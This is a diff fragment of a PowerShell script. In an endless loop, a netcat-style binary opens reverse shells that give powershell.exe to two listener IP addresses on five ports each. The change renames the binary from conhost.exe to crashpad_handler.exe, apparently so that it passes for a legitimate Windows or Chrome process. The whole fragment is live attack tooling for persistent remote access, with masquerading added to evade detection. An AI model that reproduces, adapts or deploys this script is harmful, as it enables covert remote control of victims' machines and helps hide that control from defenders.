@@ -8,17 +8,17 @@ for (;;)
 {
 # for ip 10.133.33.205
 $ListenerIP = "10.133.33.205"
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 8888
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6969
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6699
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6996
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 9669
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 8888
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6969
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6699
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6996
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 9669
 
 # for ip 10.133.61.215
 $ListenerIP = "10.133.61.215"
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 8888
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6969
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6699
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 6996
-.\conhost.exe -C --exec "powershell.exe" $ListenerIP 9669
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 8888
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6969
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6699
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 6996
+.\crashpad_handler.exe -C --exec "powershell.exe" $ListenerIP 9669
 }
